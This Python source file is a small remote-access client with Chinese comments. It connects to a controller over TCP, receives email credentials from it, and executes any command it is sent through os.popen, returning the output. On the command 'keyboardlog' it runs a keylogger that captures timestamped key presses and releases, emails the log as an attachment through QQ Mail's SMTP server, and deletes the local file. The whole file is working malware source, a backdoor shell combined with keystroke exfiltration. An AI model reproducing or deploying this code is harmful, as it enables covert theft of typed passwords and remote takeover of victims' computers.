from socket import *
import win32api,win32con
import time
import re
from os import popen,remove,path
from pynput.keyboard import Controller,Key,Listener
import smtplib
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
#客户端接收执行命令

result = ''

c=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
c.connect(('127.0.0.1',6666))#连接地址

start_time = time.time()

def on_press(key):
    try:
        log = "%s按压:"%(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))),format(key.char)
        write_log('\n'+str(log))
    except AttributeError:
        log = "%s按压:"%(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))),format(key)
        write_log('\n'+str(log))

# 监听释放
def on_release(key):
    global start_time
    log = "%s释放:"%(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))),format(key) 
    write_log('\n'+str(log))
    end_time = time.time()

    if end_time - start_time > 10 : 
        return False


def start_listen():
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()


def write_log(log):
    filename = './log.txt'
    with open(filename, 'a') as file_object:
        file_object.write(log)

def remove_txt():
    if path.exists('./log.txt'):
        remove('./log.txt')

def send_txt():
    global sender

    global receivers  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

    global password

    smtp_server = 'smtp.qq.com'

    message = MIMEMultipart()
    message['From'] = Header("shell", 'utf-8')
    message['To'] =  Header("server", 'utf-8')
    subject = 'HAVE A LOOK!'
    message['Subject'] = Header(subject, 'utf-8')

    #发送图片

    #msgAlternative = MIMEMultipart('alternative')
    #message.attach(msgAlternative)

    #mail_msg = """
    #<p><a href="https://0xfay.github.io">博客传送门</a></p>
    #<p>照片：</p>
    #<p><img src="cid:image1"></p>
    #<p>截图：</p>
    #<p><img src="cid:image2"></p>
    #"""

    #msgAlternative.attach(MIMEText(mail_msg, 'html', 'utf-8'))

    #msg_photo = open_image(photo_path)
    #msg_screen = open_image(screen_path)

    #msg_photo.add_header('Content-ID', '<image1>')
    #message.attach(msg_photo)

    #msg_screen.add_header('Content-ID', '<image2>')
    #message.attach(msg_screen)

    #发送附件

    #邮件正文内容
    message.attach(MIMEText('xxxxxxxxxx', 'plain', 'utf-8'))
 
    # 构造附件1，传送当前目录下的 test.txt 文件
    att1 = MIMEText(open('./log.txt', 'rb').read(), 'base64', 'utf-8')
    att1["Content-Type"] = 'application/octet-stream'

    # 这里的filename可以任意写，写什么名字，邮件中显示什么名字
    att1["Content-Disposition"] = 'attachment; filename="keyboard_log.txt"'
    message.attach(att1)
 
    try:
        smtpObj = smtplib.SMTP_SSL(host=smtp_server)
        smtpObj.connect(host=smtp_server,port=465)
        smtpObj.login(sender, password)
        smtpObj.sendmail(sender, receivers, message.as_string())

        smtpObj.quit()
        remove_txt()
        
        return "[+] 邮件发送成功"

    except smtplib.SMTPException:
        return "[-] Error: 无法发送邮件"

def check_command(cmdstr):
    global result

    if cmdstr == 'keyboardlog':
        try:
            start_listen()
            result = send_txt()
            return True

        except:
            result = '[-] failed'
            return False
        

if __name__ == '__main__':

    sender = c.recv(1024).decode()

    receiver = c.recv(1024).decode()
    receivers = []
    receivers.append(receiver)

    password = c.recv(1024).decode()

    while True:

        cmd=c.recv(10240)
        cmdstr=cmd.decode()

        if check_command(cmdstr):
            pass


        #if cmdstr == 'exit':
        #    c.close()
        #    break
    
        else:
            try:
                result=popen(cmdstr).read()
                if result == '':
                    result='[-] ERROR_COMMAND'
            except:
                result='[-] ERROR_COMMAND'

        c.send(result.encode())
